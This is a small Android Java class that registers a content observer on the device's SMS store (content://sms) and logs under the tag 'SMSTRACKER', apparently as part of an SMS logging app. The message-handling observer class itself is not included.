package sms.log;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

public class ActivateSMSObserver 
{
	private static final String TAG = "SMSTRACKER";
	private Context myContext;
	
	@SuppressWarnings("unused")
	private Intent myIntent;
	
	@SuppressWarnings("unused")
	private Bundle myExtras;
	
	private SmsContentObserver observer = null;
	
	private static final Uri STATUS_URI = Uri.parse("content://sms");

	public void activateSMSObserver(Context context)
	{
		Log.i(TAG,"Reciver Activated");
		try 
		{
			myContext = context;
			
			if(observer  == null)
			{
				observer = new SmsContentObserver(new Handler(), myContext);
				myContext.getContentResolver().registerContentObserver(STATUS_URI,true,observer);
			}
			
		} catch (Exception e) 
		{
			Log.i(TAG,"Error :"+e.getMessage());
		}
	}

}
